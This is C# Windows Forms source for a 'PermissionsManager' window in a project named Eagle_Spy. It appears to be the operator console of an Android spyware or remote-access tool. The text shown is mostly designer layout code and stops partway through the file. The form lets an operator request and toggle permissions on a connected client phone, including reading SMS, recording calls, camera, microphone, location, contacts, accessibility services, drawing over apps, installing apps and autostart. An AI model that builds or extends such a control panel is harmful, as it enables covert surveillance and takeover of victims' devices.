using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Eagle_Spy.My.Resources;
using Eagle_Spy.sockets;
using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Eagle_Spy;

[DesignerGenerated]
public class PermissionsManager : Form
{
	public delegate void recordnames(object[] obj);

	public delegate void updatedele(object[] obj);

	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DrakeUIButtonIcon3")]
	private DrakeUIButtonIcon _DrakeUIButtonIcon3;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Panel1")]
	private Panel _Panel1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("addactiv")]
	private Button _addactiv;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Button2")]
	private Button _Button2;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("checkbattery")]
	private DrakeUICheckBox _checkbattery;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("checkdraw")]
	private DrakeUICheckBox _checkdraw;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("checkacess")]
	private DrakeUICheckBox _checkacess;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Checkbg")]
	private DrakeUICheckBox _Checkbg;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("checkautostart")]
	private DrakeUICheckBox _checkautostart;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("checkinstall")]
	private DrakeUICheckBox _checkinstall;

	public Client Classclient;

	public bool Acces_prog;

	public bool draw_prog;

	public bool install_prog;

	public bool battary_prog;

	[field: AccessedThroughProperty("DrakeUITabControl1")]
	internal DrakeUITabControl DrakeUITabControl1
    ;

    [field: AccessedThroughProperty("TabPage1")]
	internal TabPage TabPage1
	;

	[field: AccessedThroughProperty("TabPage2")]
	internal TabPage TabPage2
    ;

    [field: AccessedThroughProperty("DGVPRIM")]
	internal DataGridView DGVPRIM
    ;


	internal DrakeUIButtonIcon DrakeUIButtonIcon3
;

	internal Panel Panel1
;

	[field: AccessedThroughProperty("Label2")]
	internal Label Label2
    ;

    [field: AccessedThroughProperty("Label1")]
	internal Label Label1
    ;

    [field: AccessedThroughProperty("comboproms")]
	internal DrakeUIComboBox comboproms
    ;

	internal Button addactiv
	;

	internal Button Button1
	;

	[field: AccessedThroughProperty("Primslist")]
	internal DrakeUIListBox Primslist
    ;

    [field: AccessedThroughProperty("Label3")]
	internal Label Label3
    ;

    [field: AccessedThroughProperty("Panel2")]
	internal Panel Panel2
    ;

    [field: AccessedThroughProperty("statustext")]
	internal Label statustext
    ;

	internal Button Button2
	;

	[field: AccessedThroughProperty("DrakeUIToolTip1")]
	internal DrakeUIToolTip DrakeUIToolTip1
	;

        [field: AccessedThroughProperty("iconprim")]
	internal DataGridViewImageColumn iconprim
	;

        [field: AccessedThroughProperty("primname")]
	internal DataGridViewTextBoxColumn primname
    ;

    [field: AccessedThroughProperty("Status")]
	internal DataGridViewTextBoxColumn Status
    ;

    [field: AccessedThroughProperty("TabPage3")]
	internal TabPage TabPage3
    ;

    [field: AccessedThroughProperty("PictureBox2")]
	internal PictureBox PictureBox2
    ;

    [field: AccessedThroughProperty("Label5")]
	internal Label Label5
    ;

    [field: AccessedThroughProperty("PictureBox1")]
	internal PictureBox PictureBox1
    ;

    [field: AccessedThroughProperty("Label4")]
	internal Label Label4
    ;

    [field: AccessedThroughProperty("TextBox1")]
	internal TextBox TextBox1
    ;
	internal DrakeUICheckBox checkbattery
	;

	internal DrakeUICheckBox checkdraw
;

	internal DrakeUICheckBox checkacess
	;

	internal DrakeUICheckBox Checkbg
	;

	internal DrakeUICheckBox checkautostart
	;

	internal DrakeUICheckBox checkinstall
	;

	[field: AccessedThroughProperty("Label6")]
	internal Label Label6
    ;
    [field: AccessedThroughProperty("Panel3")]
	internal Panel Panel3
    ;

    [field: AccessedThroughProperty("clinameinfo")]
	internal Label clinameinfo
    ;

    [field: AccessedThroughProperty("ClientPic")]
	internal PictureBox ClientPic
    ;

    [DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
				components.Dispose();
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
            this.components = new System.ComponentModel.Container();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle1 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle2 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle3 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle4 = new System.Windows.Forms.DataGridViewCellStyle();
            System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle5 = new System.Windows.Forms.DataGridViewCellStyle();
            this.DrakeUITabControl1 = new DrakeUI.Framework.DrakeUITabControl();
            this.TabPage1 = new System.Windows.Forms.TabPage();
            this.DGVPRIM = new System.Windows.Forms.DataGridView();
            this.iconprim = new System.Windows.Forms.DataGridViewImageColumn();
            this.primname = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.Status = new System.Windows.Forms.DataGridViewTextBoxColumn();
            this.DrakeUIButtonIcon3 = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.TabPage2 = new System.Windows.Forms.TabPage();
            this.Button1 = new System.Windows.Forms.Button();
            this.Button2 = new System.Windows.Forms.Button();
            this.Primslist = new DrakeUI.Framework.DrakeUIListBox();
            this.addactiv = new System.Windows.Forms.Button();
            this.comboproms = new DrakeUI.Framework.DrakeUIComboBox();
            this.Panel1 = new System.Windows.Forms.Panel();
            this.checkinstall = new DrakeUI.Framework.DrakeUICheckBox();
            this.Label6 = new System.Windows.Forms.Label();
            this.checkbattery = new DrakeUI.Framework.DrakeUICheckBox();
            this.checkdraw = new DrakeUI.Framework.DrakeUICheckBox();
            this.checkacess = new DrakeUI.Framework.DrakeUICheckBox();
            this.Label3 = new System.Windows.Forms.Label();
            this.Label2 = new System.Windows.Forms.Label();
            this.Label1 = new System.Windows.Forms.Label();
            this.TabPage3 = new System.Windows.Forms.TabPage();
            this.Checkbg = new DrakeUI.Framework.DrakeUICheckBox();
            this.checkautostart = new DrakeUI.Framework.DrakeUICheckBox();
            this.PictureBox2 = new System.Windows.Forms.PictureBox();
            this.Label5 = new System.Windows.Forms.Label();
            this.PictureBox1 = new System.Windows.Forms.PictureBox();
            this.Label4 = new System.Windows.Forms.Label();
            this.TextBox1 = new System.Windows.Forms.TextBox();
            this.Panel2 = new System.Windows.Forms.Panel();
            this.statustext = new System.Windows.Forms.Label();
            this.DrakeUIToolTip1 = new DrakeUI.Framework.DrakeUIToolTip(this.components);
            this.Panel3 = new System.Windows.Forms.Panel();
            this.clinameinfo = new System.Windows.Forms.Label();
            this.ClientPic = new System.Windows.Forms.PictureBox();
            this.DrakeUITabControl1.SuspendLayout();
            this.TabPage1.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.DGVPRIM)).BeginInit();
            this.TabPage2.SuspendLayout();
            this.Panel1.SuspendLayout();
            this.TabPage3.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.PictureBox2)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.PictureBox1)).BeginInit();
            this.Panel2.SuspendLayout();
            this.Panel3.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.ClientPic)).BeginInit();
            this.SuspendLayout();
            // 
            // DrakeUITabControl1
            // 
            this.DrakeUITabControl1.Controls.Add(this.TabPage1);
            this.DrakeUITabControl1.Controls.Add(this.TabPage2);
            this.DrakeUITabControl1.Controls.Add(this.TabPage3);
            this.DrakeUITabControl1.Dock = System.Windows.Forms.DockStyle.Fill;
            this.DrakeUITabControl1.DrawMode = System.Windows.Forms.TabDrawMode.OwnerDrawFixed;
            this.DrakeUITabControl1.FillColor = System.Drawing.Color.Black;
            this.DrakeUITabControl1.Font = new System.Drawing.Font("Calibri", 12F);
            this.DrakeUITabControl1.ItemSize = new System.Drawing.Size(250, 40);
            this.DrakeUITabControl1.Location = new System.Drawing.Point(0, 0);
            this.DrakeUITabControl1.Margin = new System.Windows.Forms.Padding(2);
            this.DrakeUITabControl1.MenuStyle = DrakeUI.Framework.UIMenuStyle.Custom;
            this.DrakeUITabControl1.Name = "DrakeUITabControl1";
            this.DrakeUITabControl1.SelectedIndex = 0;
            this.DrakeUITabControl1.Size = new System.Drawing.Size(700, 463);
            this.DrakeUITabControl1.SizeMode = System.Windows.Forms.TabSizeMode.Fixed;
            this.DrakeUITabControl1.Style = DrakeUI.Framework.UIStyle.Custom;
            this.DrakeUITabControl1.TabBackColor = System.Drawing.Color.Black;
            this.DrakeUITabControl1.TabIndex = 0;
            this.DrakeUITabControl1.TabSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(10)))), ((int)(((byte)(10)))));
            this.DrakeUITabControl1.TabSelectedForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUITabControl1.TabSelectedHighColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUITabControl1.TabUnSelectedForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(240)))), ((int)(((byte)(240)))), ((int)(((byte)(240)))));
            // 
            // TabPage1
            // 
            this.TabPage1.BackColor = System.Drawing.Color.Black;
            this.TabPage1.Controls.Add(this.DGVPRIM);
            this.TabPage1.Controls.Add(this.DrakeUIButtonIcon3);
            this.TabPage1.Location = new System.Drawing.Point(0, 40);
            this.TabPage1.Margin = new System.Windows.Forms.Padding(2);
            this.TabPage1.Name = "TabPage1";
            this.TabPage1.Size = new System.Drawing.Size(700, 423);
            this.TabPage1.TabIndex = 0;
            this.TabPage1.Text = "Manage";
            // 
            // DGVPRIM
            // 
            this.DGVPRIM.AllowUserToAddRows = false;
            this.DGVPRIM.AllowUserToDeleteRows = false;
            this.DGVPRIM.AllowUserToResizeColumns = false;
            this.DGVPRIM.AllowUserToResizeRows = false;
            dataGridViewCellStyle1.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle1.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle1.SelectionBackColor = System.Drawing.Color.White;
            dataGridViewCellStyle1.SelectionForeColor = System.Drawing.Color.Black;
            this.DGVPRIM.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle1;
            this.DGVPRIM.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.Fill;
            this.DGVPRIM.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
            this.DGVPRIM.BackgroundColor = System.Drawing.Color.Black;
            this.DGVPRIM.BorderStyle = System.Windows.Forms.BorderStyle.None;
            dataGridViewCellStyle2.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle2.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle2.Font = new System.Drawing.Font("Calibri", 12F);
            dataGridViewCellStyle2.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle2.SelectionBackColor = System.Drawing.Color.White;
            dataGridViewCellStyle2.SelectionForeColor = System.Drawing.Color.Black;
            dataGridViewCellStyle2.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.DGVPRIM.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle2;
            this.DGVPRIM.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
            this.DGVPRIM.Columns.AddRange(new System.Windows.Forms.DataGridViewColumn[] {
            this.iconprim,
            this.primname,
            this.Status});
            dataGridViewCellStyle3.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle3.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle3.Font = new System.Drawing.Font("Calibri", 12F);
            dataGridViewCellStyle3.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle3.SelectionBackColor = System.Drawing.Color.White;
            dataGridViewCellStyle3.SelectionForeColor = System.Drawing.Color.Black;
            dataGridViewCellStyle3.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
            this.DGVPRIM.DefaultCellStyle = dataGridViewCellStyle3;
            this.DGVPRIM.Dock = System.Windows.Forms.DockStyle.Fill;
            this.DGVPRIM.EnableHeadersVisualStyles = false;
            this.DGVPRIM.GridColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DGVPRIM.Location = new System.Drawing.Point(0, 54);
            this.DGVPRIM.Margin = new System.Windows.Forms.Padding(2);
            this.DGVPRIM.Name = "DGVPRIM";
            dataGridViewCellStyle4.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
            dataGridViewCellStyle4.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle4.Font = new System.Drawing.Font("Calibri", 12F);
            dataGridViewCellStyle4.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle4.SelectionBackColor = System.Drawing.Color.White;
            dataGridViewCellStyle4.SelectionForeColor = System.Drawing.Color.Black;
            dataGridViewCellStyle4.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
            this.DGVPRIM.RowHeadersDefaultCellStyle = dataGridViewCellStyle4;
            this.DGVPRIM.RowHeadersVisible = false;
            dataGridViewCellStyle5.BackColor = System.Drawing.Color.Black;
            dataGridViewCellStyle5.ForeColor = System.Drawing.Color.White;
            dataGridViewCellStyle5.SelectionBackColor = System.Drawing.Color.White;
            dataGridViewCellStyle5.SelectionForeColor = System.Drawing.Color.Black;
            this.DGVPRIM.RowsDefaultCellStyle = dataGridViewCellStyle5;
            this.DGVPRIM.RowTemplate.Height = 24;
            this.DGVPRIM.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
            this.DGVPRIM.ShowCellErrors = false;
            this.DGVPRIM.ShowEditingIcon = false;
            this.DGVPRIM.ShowRowErrors = false;
            this.DGVPRIM.Size = new System.Drawing.Size(700, 369);
            this.DGVPRIM.TabIndex = 0;
            // 
            // iconprim
            // 
            this.iconprim.FillWeight = 20F;
            this.iconprim.HeaderText = " ";
            this.iconprim.Name = "iconprim";
            // 
            // primname
            // 
            this.primname.FillWeight = 73.85786F;
            this.primname.HeaderText = "Permission";
            this.primname.Name = "primname";
            // 
            // Status
            // 
            this.Status.FillWeight = 45F;
            this.Status.HeaderText = "isActive";
            this.Status.Name = "Status";
            // 
            // DrakeUIButtonIcon3
            // 
            this.DrakeUIButtonIcon3.Cursor = System.Windows.Forms.Cursors.Hand;
            this.DrakeUIButtonIcon3.Dock = System.Windows.Forms.DockStyle.Top;
            this.DrakeUIButtonIcon3.FillColor = System.Drawing.Color.Black;
            this.DrakeUIButtonIcon3.Font = new System.Drawing.Font("Calibri", 12F);
            this.DrakeUIButtonIcon3.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon3.Location = new System.Drawing.Point(0, 0);
            this.DrakeUIButtonIcon3.Margin = new System.Windows.Forms.Padding(2);
            this.DrakeUIButtonIcon3.Name = "DrakeUIButtonIcon3";
            this.DrakeUIButtonIcon3.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIButtonIcon3.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.DrakeUIButtonIcon3.Size = new System.Drawing.Size(700, 54);
            this.DrakeUIButtonIcon3.Style = DrakeUI.Framework.UIStyle.Custom;
            this.DrakeUIButtonIcon3.Symbol = 61473;
            this.DrakeUIButtonIcon3.TabIndex = 34;
            this.DrakeUIButtonIcon3.Text = "Refresh";
            this.DrakeUIButtonIcon3.Click += new System.EventHandler(this.DrakeUIButtonIcon3_Click);
            // 
            // TabPage2
            // 
            this.TabPage2.BackColor = System.Drawing.Color.Black;
            this.TabPage2.Controls.Add(this.Button1);
            this.TabPage2.Controls.Add(this.Button2);
            this.TabPage2.Controls.Add(this.Primslist);
            this.TabPage2.Controls.Add(this.addactiv);
            this.TabPage2.Controls.Add(this.comboproms);
            this.TabPage2.Controls.Add(this.Panel1);
            this.TabPage2.Location = new System.Drawing.Point(0, 40);
            this.TabPage2.Margin = new System.Windows.Forms.Padding(2);
            this.TabPage2.Name = "TabPage2";
            this.TabPage2.Size = new System.Drawing.Size(700, 391);
            this.TabPage2.TabIndex = 1;
            this.TabPage2.Text = "Request";
            // 
            // Button1
            // 
            this.Button1.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.Button1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.Button1.Location = new System.Drawing.Point(532, 324);
            this.Button1.Margin = new System.Windows.Forms.Padding(2);
            this.Button1.Name = "Button1";
            this.Button1.Size = new System.Drawing.Size(128, 34);
            this.Button1.TabIndex = 30;
            this.Button1.Text = "Request Now";
            this.Button1.UseVisualStyleBackColor = true;
            this.Button1.Click += new System.EventHandler(this.Button1_Click);
            // 
            // Button2
            // 
            this.Button2.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.Button2.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.Button2.Location = new System.Drawing.Point(612, 120);
            this.Button2.Margin = new System.Windows.Forms.Padding(2);
            this.Button2.Name = "Button2";
            this.Button2.Size = new System.Drawing.Size(49, 28);
            this.Button2.TabIndex = 31;
            this.Button2.Text = "-";
            this.DrakeUIToolTip1.SetToolTip(this.Button2, "REMOVE");
            this.Button2.UseVisualStyleBackColor = true;
            this.Button2.Click += new System.EventHandler(this.Button2_Click);
            // 
            // Primslist
            // 
            this.Primslist.BackColor = System.Drawing.Color.Black;
            this.Primslist.FillColor = System.Drawing.Color.Black;
            this.Primslist.FillDisableColor = System.Drawing.Color.Black;
            this.Primslist.Font = new System.Drawing.Font("Calibri", 12F);
            this.Primslist.ForeColor = System.Drawing.Color.White;
            this.Primslist.HoverColor = System.Drawing.Color.Silver;
            this.Primslist.ItemSelectBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(140)))), ((int)(((byte)(140)))), ((int)(((byte)(140)))));
            this.Primslist.ItemSelectForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.Primslist.Location = new System.Drawing.Point(35, 156);
            this.Primslist.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
            this.Primslist.Name = "Primslist";
            this.Primslist.Padding = new System.Windows.Forms.Padding(7);
            this.Primslist.Radius = 15;
            this.Primslist.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.Primslist.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.Primslist.Size = new System.Drawing.Size(625, 162);
            this.Primslist.Style = DrakeUI.Framework.UIStyle.Custom;
            this.Primslist.StyleCustomMode = true;
            this.Primslist.TabIndex = 29;
            this.Primslist.Text = "DrakeUIListBox1";
            // 
            // addactiv
            // 
            this.addactiv.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.addactiv.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.addactiv.Location = new System.Drawing.Point(549, 120);
            this.addactiv.Margin = new System.Windows.Forms.Padding(2);
            this.addactiv.Name = "addactiv";
            this.addactiv.Size = new System.Drawing.Size(49, 28);
            this.addactiv.TabIndex = 28;
            this.addactiv.Text = "+";
            this.DrakeUIToolTip1.SetToolTip(this.addactiv, "ADD");
            this.addactiv.UseVisualStyleBackColor = true;
            this.addactiv.Click += new System.EventHandler(this.Addactiv_Click);
            // 
            // comboproms
            // 
            this.comboproms.DropDownStyle = DrakeUI.Framework.UIDropDownStyle.DropDownList;
            this.comboproms.FillColor = System.Drawing.Color.White;
            this.comboproms.Font = new System.Drawing.Font("Calibri", 14F);
            this.comboproms.Items.AddRange(new object[] {
            "Send SMS",
            "Record Calls",
            "Change Wallpaper",
            "Read SMS",
            "Read Call Logs",
            "Read Contacts",
            "Read Accounts",
            "Camera",
            "Microphone",
            "Location",
            "Make Calls"});
            this.comboproms.Location = new System.Drawing.Point(35, 120);
            this.comboproms.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
            this.comboproms.MinimumSize = new System.Drawing.Size(47, 0);
            this.comboproms.Name = "comboproms";
            this.comboproms.Padding = new System.Windows.Forms.Padding(0, 0, 22, 0);
            this.comboproms.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(56)))), ((int)(((byte)(142)))), ((int)(((byte)(60)))));
            this.comboproms.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.comboproms.Size = new System.Drawing.Size(500, 30);
            this.comboproms.Style = DrakeUI.Framework.UIStyle.Green;
            this.comboproms.TabIndex = 27;
            this.comboproms.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
            // 
            // Panel1
            // 
            this.Panel1.Controls.Add(this.checkinstall);
            this.Panel1.Controls.Add(this.Label6);
            this.Panel1.Controls.Add(this.checkbattery);
            this.Panel1.Controls.Add(this.checkdraw);
            this.Panel1.Controls.Add(this.checkacess);
            this.Panel1.Controls.Add(this.Label3);
            this.Panel1.Controls.Add(this.Label2);
            this.Panel1.Controls.Add(this.Label1);
            this.Panel1.Dock = System.Windows.Forms.DockStyle.Top;
            this.Panel1.Location = new System.Drawing.Point(0, 0);
            this.Panel1.Margin = new System.Windows.Forms.Padding(2);
            this.Panel1.Name = "Panel1";
            this.Panel1.Size = new System.Drawing.Size(700, 97);
            this.Panel1.TabIndex = 0;
            this.Panel1.Paint += new System.Windows.Forms.PaintEventHandler(this.Panel1_Paint);
            // 
            // checkinstall
            // 
            this.checkinstall.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(136)))), ((int)(((byte)(229)))));
            this.checkinstall.Cursor = System.Windows.Forms.Cursors.Hand;
            this.checkinstall.Font = new System.Drawing.Font("Calibri", 12F);
            this.checkinstall.Location = new System.Drawing.Point(22, 63);
            this.checkinstall.Margin = new System.Windows.Forms.Padding(2);
            this.checkinstall.Name = "checkinstall";
            this.checkinstall.Padding = new System.Windows.Forms.Padding(16, 0, 0, 0);
            this.checkinstall.Size = new System.Drawing.Size(32, 24);
            this.checkinstall.TabIndex = 17;
            this.checkinstall.MouseClick += new System.Windows.Forms.MouseEventHandler(this.DrakeUICheckBox1_MouseClick);
            // 
            // Label6
            // 
            this.Label6.AutoSize = true;
            this.Label6.Font = new System.Drawing.Font("Calibri", 12F);
            this.Label6.ForeColor = System.Drawing.Color.White;
            this.Label6.Location = new System.Drawing.Point(58, 65);
            this.Label6.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.Label6.Name = "Label6";
            this.Label6.Size = new System.Drawing.Size(85, 19);
            this.Label6.TabIndex = 16;
            this.Label6.Text = "Install Apps";
            // 
            // checkbattery
            // 
            this.checkbattery.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(136)))), ((int)(((byte)(229)))));
            this.checkbattery.Cursor = System.Windows.Forms.Cursors.Hand;
            this.checkbattery.Font = new System.Drawing.Font("Calibri", 12F);
            this.checkbattery.Location = new System.Drawing.Point(531, 28);
            this.checkbattery.Margin = new System.Windows.Forms.Padding(2);
            this.checkbattery.Name = "checkbattery";
            this.checkbattery.Padding = new System.Windows.Forms.Padding(16, 0, 0, 0);
            this.checkbattery.Size = new System.Drawing.Size(32, 24);
            this.checkbattery.TabIndex = 15;
            this.checkbattery.MouseClick += new System.Windows.Forms.MouseEventHandler(this.checkbattery_MouseClick);
            // 
            // checkdraw
            // 
            this.checkdraw.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(136)))), ((int)(((byte)(229)))));
            this.checkdraw.Cursor = System.Windows.Forms.Cursors.Hand;
            this.checkdraw.Font = new System.Drawing.Font("Calibri", 12F);
            this.checkdraw.Location = new System.Drawing.Point(286, 28);
            this.checkdraw.Margin = new System.Windows.Forms.Padding(2);
            this.checkdraw.Name = "checkdraw";
            this.checkdraw.Padding = new System.Windows.Forms.Padding(16, 0, 0, 0);
            this.checkdraw.Size = new System.Drawing.Size(32, 24);
            this.checkdraw.TabIndex = 14;
            this.checkdraw.MouseClick += new System.Windows.Forms.MouseEventHandler(this.Checkdraw_MouseClick);
            // 
            // checkacess
            // 
            this.checkacess.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(136)))), ((int)(((byte)(229)))));
            this.checkacess.Cursor = System.Windows.Forms.Cursors.Hand;
            this.checkacess.Font = new System.Drawing.Font("Calibri", 12F);
            this.checkacess.Location = new System.Drawing.Point(22, 28);
            this.checkacess.Margin = new System.Windows.Forms.Padding(2);
            this.checkacess.Name = "checkacess";
            this.checkacess.Padding = new System.Windows.Forms.Padding(16, 0, 0, 0);
            this.checkacess.Size = new System.Drawing.Size(32, 24);
            this.checkacess.TabIndex = 13;
            this.checkacess.MouseClick += new System.Windows.Forms.MouseEventHandler(this.Checkacess_MouseClick);
            // 
            // Label3
            // 
            this.Label3.AutoSize = true;
            this.Label3.Font = new System.Drawing.Font("Calibri", 12F);
            this.Label3.ForeColor = System.Drawing.Color.White;
            this.Label3.Location = new System.Drawing.Point(568, 28);
            this.Label3.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.Label3.Name = "Label3";
            this.Label3.Size = new System.Drawing.Size(127, 19);
            this.Label3.TabIndex = 12;
            this.Label3.Text = "Battery optimizing";
            // 
            // Label2
            // 
            this.Label2.AutoSize = true;
            this.Label2.Font = new System.Drawing.Font("Calibri", 12F);
            this.Label2.ForeColor = System.Drawing.Color.White;
            this.Label2.Location = new System.Drawing.Point(316, 28);
            this.Label2.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.Label2.Name = "Label2";
            this.Label2.Size = new System.Drawing.Size(131, 19);
            this.Label2.TabIndex = 9;
            this.Label2.Text = "Drawing over Apps";
            // 
            // Label1
            // 
            this.Label1.AutoSize = true;
            this.Label1.Font = new System.Drawing.Font("Calibri", 12F);
            this.Label1.ForeColor = System.Drawing.Color.White;
            this.Label1.Location = new System.Drawing.Point(58, 29);
            this.Label1.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.Label1.Name = "Label1";
            this.Label1.Size = new System.Drawing.Size(147, 19);
            this.Label1.TabIndex = 7;
            this.Label1.Text = "Accessibility Services";
            // 
            // TabPage3
            // 
            this.TabPage3.BackColor = System.Drawing.Color.Black;
            this.TabPage3.Controls.Add(this.Checkbg);
            this.TabPage3.Controls.Add(this.checkautostart);
            this.TabPage3.Controls.Add(this.PictureBox2);
            this.TabPage3.Controls.Add(this.Label5);
            this.TabPage3.Controls.Add(this.PictureBox1);
            this.TabPage3.Controls.Add(this.Label4);
            this.TabPage3.Controls.Add(this.TextBox1);
            this.TabPage3.Location = new System.Drawing.Point(0, 40);
            this.TabPage3.Margin = new System.Windows.Forms.Padding(2);
            this.TabPage3.Name = "TabPage3";
            this.TabPage3.Size = new System.Drawing.Size(700, 391);
            this.TabPage3.TabIndex = 2;
            this.TabPage3.Text = "MIUI (oppo,vevo,etc...)";
            // 
            // Checkbg
            // 
            this.Checkbg.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(136)))), ((int)(((byte)(229)))));
            this.Checkbg.Cursor = System.Windows.Forms.Cursors.Hand;
            this.Checkbg.Font = new System.Drawing.Font("Calibri", 12F);
            this.Checkbg.Location = new System.Drawing.Point(456, 53);
            this.Checkbg.Margin = new System.Windows.Forms.Padding(2);
            this.Checkbg.Name = "Checkbg";
            this.Checkbg.Padding = new System.Windows.Forms.Padding(16, 0, 0, 0);
            this.Checkbg.Size = new System.Drawing.Size(32, 24);
            this.Checkbg.TabIndex = 17;
            this.Checkbg.MouseClick += new System.Windows.Forms.MouseEventHandler(this.Checkbg_MouseClick);
            // 
            // checkautostart
            // 
            this.checkautostart.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(136)))), ((int)(((byte)(229)))));
            this.checkautostart.Cursor = System.Windows.Forms.Cursors.Hand;
